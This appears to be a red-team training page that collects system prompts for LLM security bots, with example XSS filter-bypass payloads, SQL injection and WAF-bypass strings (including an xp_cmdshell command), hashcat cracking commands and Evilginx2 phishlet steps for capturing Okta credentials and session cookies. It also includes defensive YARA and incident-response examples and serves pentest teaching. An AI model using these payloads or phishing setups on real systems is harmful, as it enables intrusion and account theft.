---
layout: training-page
title: "AI Security Bots — Red/Blue/Purple Team Prompts — Red Team Academy"
module: "AI Red Team Agents"
tags:
  - ai
  - gpt
  - prompts
  - red-team
  - blue-team
  - purple-team
  - xss
  - sqli
  - nuclei
  - osint
  - llm
page_key: "ai-security-bots"
render_with_liquid: false
---

# AI Security Bots — Red / Blue / Purple Team Prompt Library

A curated library of system prompts for building specialized AI security bots using ChatGPT, Claude, or any LLM. Each bot has a defined persona, specific instructions, and domain knowledge that makes it behave as a focused security assistant rather than a general-purpose chatbot. These prompts can be deployed as Custom GPTs (OpenAI GPT Store), Claude Projects, or injected as system prompts via the API. They cover offensive tooling, defensive analysis, and purple team operations.

## How to Use These Prompts

```
# Option 1 — Custom GPT (OpenAI):
# chat.openai.com → Explore GPTs → Create → Configure
# Paste the system prompt into the "Instructions" field
# Set name, icon, and capabilities (code interpreter, web browsing as needed)

# Option 2 — Claude Project (Anthropic):
# claude.ai → Projects → New Project → Project Instructions
# Paste the system prompt as the project instructions
# All conversations in the project inherit the persona

# Option 3 — API / Claude Code:
# Pass the prompt as the system parameter:
curl https://api.anthropic.com/v1/messages \
  -H "x-api-key: $ANTHROPIC_API_KEY" \
  -H "anthropic-version: 2023-06-01" \
  -H "content-type: application/json" \
  -d '{
    "model": "claude-opus-4-6",
    "max_tokens": 4096,
    "system": "[PASTE SYSTEM PROMPT HERE]",
    "messages": [{"role": "user", "content": "Your request here"}]
  }'
```

## Red Team Bots

### XSS Mutation Bot

Takes an XSS payload or URL and generates 15 filter-bypass mutations plus 15 event-handler variants. Use when a basic XSS is caught by a WAF and you need alternatives.

```
# How to use:
# Give the bot a URL with an XSS injection point OR a raw XSS payload.
# It returns:
#   - 15 mutations using encoding, case, concatenation, nesting tricks
#   - 15 variants using different event handlers

# Example input:
"https://target.com/search?q=<script>alert(1)</script>"

# Example output categories:
# Concatenation bypass:    <scri+pt>alert(1)</scr+ipt>
# Nested tags:             <scr<script>ipt>alert(1)</scr</script>ipt>
# Case variation:          <ScRiPt>aLeRt(1)</ScRiPt>
# Double encoding:         %3Cscript%3Ealert(1)%3C/script%3E
# HTML entities:           &lt;script&gt;alert(1)&lt;/script&gt;
# Null byte:               <scr%00ipt>alert(1)</scr%00ipt>
# Event handlers:          <img src=x onerror=alert(1)>
#                          <svg onload=alert(1)>
#                          <body onpageshow=alert(1)>

# System prompt key instructions:
# - Input: URL or payload from pentest
# - Output: 15 filter-bypass mutations + 15 event handler variants
# - Draws from: JS encoding tricks, event handlers, WAF bypass research
```

### SQLiBot

Takes a SQL injection scenario or target parameter and generates payload mutations covering 5 database types (MySQL, PostgreSQL, MSSQL, Oracle, SQLite). Includes WAF bypass variants.

```
# How to use:
# Describe the injection point or provide a partial payload.
# The bot generates 15 standard payloads + 5 WAF bypass variants.

# Example input:
"Login form, username field, suspected MySQL backend.
 ' OR '1'='1 is blocked. Generate mutations."

# Example output:
# Standard payloads:
# admin' --
# admin'/*
# ' OR 1=1 --
# ' OR 'x'='x
# 1' AND SLEEP(5)--    (time-based blind)
# ' UNION SELECT NULL,NULL--
# ') OR ('1'='1

# WAF bypass variants:
# 'OR(1)=(1)--          (no spaces)
# '/**/OR/**/1=1--      (comment injection)
# ' %4fR 1=1--          (URL encoded O)
# '||'1'='1             (concat operator)
# ';EXEC xp_cmdshell('whoami')--  (MSSQL)

# Break & Repair methodology (from SQLiBot cheatsheet):
# 1. Find a "valid value" (e.g. search term returning results)
# 2. Append ' to break: shirt'   (should change response)
# 3. Test repairs: shirt' '   shirt'||'   shirt'+'
# 4. If repair restores original response = SQLi confirmed
# Never use OR 1=1 unless nothing else works (too destructive)
```

### JS Doctor

Analyzes a JavaScript file and extracts all URLs, API endpoints, paths, and user-input handling points. Output includes curl commands for each API call found.

```
# How to use:
# Paste a JavaScript file (or portion) as input.
# The bot returns:

# Section 1 — URLS:
# All URLs found — both hardcoded strings AND dynamically constructed ones
# Example: https://api.example.com/v1/users/123

# Section 2 — API CALLS:
# All API endpoints with:
# - Method (GET/POST/PUT/DELETE)
# - Path
# - curl command including relevant headers and cookies from the JS

# Example output:
# API endpoint: POST /api/login
# curl -X POST "https://example.com/api/login" \
#   -H "Content-Type: application/json" \
#   -H "Authorization: Bearer [TOKEN]" \
#   -d '{"username":"","password":""}'

# Section 3 — USER INPUT:
# All locations where user input is used:
# - Form submissions
# - URL parameters read via window.location
# - localStorage / sessionStorage reads
# - postMessage handlers
# - eval() calls with variable input

# Use case:
# Paste the main.js / app.bundle.js of the target
# Instantly discover all API routes without manually reading the code
```

### Subdomain Doctor

Takes a list of known subdomains, identifies naming patterns and conventions, and generates 30 new subdomain candidates likely to exist based on pattern extrapolation.

```
# How to use:
# Paste a list of known subdomains for the target.
# The bot analyzes patterns and outputs 30 new candidates.

# Example input:
"api.corp.com
 dev.corp.com
 staging.corp.com
 admin.corp.com
 mail.corp.com"

# The bot identifies:
# - Environments: dev, staging, prod, test, uat, qa
# - Services: api, mail, vpn, auth, sso, app, dashboard
# - Numbered sequences: api1, api2, api-v2
# - Regional variants: us-api, eu-api, asia-api
# - Internal patterns: int-api, corp-api, internal

# Example generated candidates:
# vpn.corp.com
# sso.corp.com
# auth.corp.com
# internal.corp.com
# uat.corp.com
# api-v2.corp.com
# us-api.corp.com
# ...

# Validate the candidates:
while IFS= read -r sub; do
  host "$sub.corp.com" 2>/dev/null | grep "has address" && echo "[+] $sub"
done < candidates.txt
```

### Nuclei Template Doctor

Takes a vulnerability proof-of-concept (HTTP request, CVE description, or exploit code) and writes a working Nuclei YAML template to detect it at scale.

```
# How to use:
# Paste a POC, CVE description, or vulnerable HTTP request.
# The bot generates a Nuclei YAML template.

# Example input:
"CVE-2024-XXXX: Unauthenticated RCE via /api/exec endpoint.
 POST /api/exec HTTP/1.1
 Content-Type: application/json
 {'cmd': 'id'} returns command output in JSON response"

# Example output (Nuclei YAML):
# id: cve-2024-xxxx-rce
# info:
#   name: Example App RCE via /api/exec
#   author: generated
#   severity: critical
#   tags: rce,unauth
# requests:
#   - method: POST
#     path: "{{BaseURL}}/api/exec"
#     headers:
#       Content-Type: application/json
#     body: '{"cmd":"id"}'
#     matchers:
#       - type: regex
#         regex: "uid=[0-9]+(.*gid=[0-9]+)"

# Use the generated template:
nuclei -t generated_template.yaml -u https://target.com
nuclei -t generated_template.yaml -l targets.txt -o results.txt
```

### Acquisition & Recon Bot

OSINT bot focused on corporate acquisitions and business intelligence. Given a company name, it searches Crunchbase, PitchBook, Mergr, LinkedIn, and financial news sources to map subsidiaries, acquisitions, and corporate structure.

```
# How to use:
# Input: company name
# Output: chronological list of acquisitions with dates and sources

# Use case in red teaming:
# Acquired companies often:
# - Retain separate IT infrastructure with different security posture
# - Have weaker email security (different domain, old SPF/DMARC)
# - Not yet integrated into SSO/MFA requirements
# - Have legacy VPN or RDP still exposed

# Example input: "Microsoft"
# Bot searches: crunchbase.com, mergr.com, pitchbook.com,
#               finance.yahoo.com, Wikipedia, Google news

# Example output:
# - 2024-03-12: Inflection AI — source: WSJ
# - 2023-10-15: Activision Blizzard ($69B) — source: SEC filing
# - 2022-04-25: Nuance Communications ($19.7B) — source: SEC filing
# ...

# Cross-reference with subdomain recon:
# For each acquisition, run:
amass enum -passive -d [acquired-domain.com]
subfinder -d [acquired-domain.com]
```

### Hash Doctor

Scans text for cryptographic hash strings, identifies the likely algorithm by length and charset, and lists them in structured format for cracking or further analysis.

```
# How to use:
# Paste any text containing hashes (config files, database dumps, code, etc.)
# The bot identifies all hashes and their probable algorithm.

# Input example:
"user_password: 5f4dcc3b5aa765d61d8327deb882cf99
 api_key_hash: 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"

# Output:
# 5f4dcc3b5aa765d61d8327deb882cf99  (MD5)
# 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824  (SHA-256)

# Common hash lengths for reference:
# MD5:      32 hex chars
# SHA-1:    40 hex chars
# SHA-256:  64 hex chars
# SHA-512:  128 hex chars
# bcrypt:   60 chars starting with $2b$ or $2y$
# NTLM:     32 hex chars (same length as MD5)

# Crack identified hashes:
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt   # MD5
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt # NTLM
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt # SHA-256
```

## Blue Team Bots

### YARA Rule Bot

Takes malware samples, indicators of compromise (IOCs), or behavioral descriptions and writes YARA rules to detect them.

```
# How to use:
# Paste: a malware sample's characteristics, strings observed, or IOCs
# Output: valid YARA rule

# Example input:
"Malware creates registry key HKCU\Software\Updater,
 drops a file named svchost32.exe to %TEMP%,
 makes HTTP requests to User-Agent: Mozilla/5.0 (Windows; Updater/2.0)"

# Example output:
# rule suspicious_updater {
#   meta:
#     description = "Detects Updater-style persistence malware"
#     author = "generated"
#   strings:
#     $reg_key = "Software\\Updater" wide ascii
#     $filename = "svchost32.exe" wide ascii
#     $ua = "Updater/2.0" ascii
#   condition:
#     2 of them
# }

# Test the rule:
yara -r rule.yar /path/to/scan/
```

### Nuclei Incident Detector (SOC Bot)

Takes an incident description or alert from a SIEM and generates a structured incident response playbook with investigation steps, containment actions, and detection queries.

```
# How to use:
# Paste a SIEM alert, log excerpt, or incident description.
# The bot generates:
# - Incident classification (severity, category)
# - Timeline of events (reconstructed from logs)
# - Investigation steps (what to check next)
# - Containment actions (immediate + long-term)
# - Detection queries (Splunk SPL, ELK DSL, Sigma rules)

# Example input:
"EDR alert: cmd.exe spawned by WINWORD.exe on host WS-047
 Child process: powershell.exe -enc [base64]
 Network: outbound TCP 443 to 185.220.101.55 (Tor exit node)"

# Example output:
# Severity: HIGH — Macro-based payload delivery (T1059.001, T1566.001)
# Immediate actions:
#   1. Isolate WS-047 from network
#   2. Preserve memory (volatility memdump or EDR snapshot)
#   3. Revoke session tokens for logged-in user
# Investigation steps:
#   4. Identify the Word document opened (parent process command line)
#   5. Decode the base64 PowerShell command
#   6. Check for additional C2 connections from the host
# Splunk query:
#   index=edr host=WS-047 parent_process=WINWORD.exe
#   | table _time, process_name, cmdline, network_dst
```

## Purple Team Bots

### Evilginx2 Bot

Expert assistant for setting up Evilginx2 reverse proxy phishing campaigns, writing phishlets for specific target platforms, and analyzing captured credentials.

```
# How to use:
# Ask for help with:
# - Setting up Evilginx2 server (DNS, TLS, lure configuration)
# - Writing a phishlet for a specific SaaS app
# - Analyzing session token captures

# Example phishlet generation input:
"Write an Evilginx2 phishlet for Okta tenant: mytenant.okta.com
 targeting credential and session cookie capture"

# Bot generates phishlet YAML with:
proxy_hosts:  # which domains to proxy
sub_filters:  # URL/content rewriting rules
auth_tokens:  # which cookies to capture
credentials:  # login form field extraction regex
login:        # the landing URL path

# Key Evilginx2 operations the bot assists with:
# phishlets hostname [name] [phishing-domain]
# phishlets enable [name]
# lures create [phishlet-name]
# lures get-url [lure-id]
# sessions       ← shows all captured credentials/tokens
# sessions [id]  ← full details for a specific session
```

## How to Build Your Own Security Bot

```
# System prompt structure that works well for security bots:

# SECTION 1 — IDENTITY AND PURPOSE
# - Define the bot's specialty (e.g., "XSS mutation engine")
# - Establish authority ("expert in web application security")
# - State scope ("always for authorized pentesters")

# SECTION 2 — INSTRUCTIONS
# - Step-by-step behavior (analyze input → generate output)
# - Output format specification (numbered list, JSON, YAML, etc.)
# - Example input → example output (few-shot examples are powerful)

# SECTION 3 — KNOWLEDGE BASE / CHEATSHEET
# - Embed a domain-specific cheatsheet directly in the prompt
# - The bot "knows" this without needing to search for it
# - Examples: SQLi payloads, XSS bypass tricks, Nuclei template syntax

# SECTION 4 — OUTPUT RULES
# - "Always link your sources"
# - "Output only YAML, no explanation"
# - "Do 15 standard + 5 WAF bypass variants"

# Test your bot against edge cases before deploying:
# - Empty input
# - Non-security input (should politely redirect)
# - Request for harmful content outside scope (should decline)
```

## Resources

- Red Blue Purple AI — `github.com/JasonHaddix/redbluepurpleAI`
- OpenAI Custom GPTs — `chat.openai.com/gpts/editor`
- Claude Projects — `claude.ai`
- Nuclei templates — `github.com/projectdiscovery/nuclei-templates`
- Related: [Prompt Injection](/ai-agents/prompt-injection/)
- Related: [AI Red Team Agents](/ai-agents/red-team-agents/)
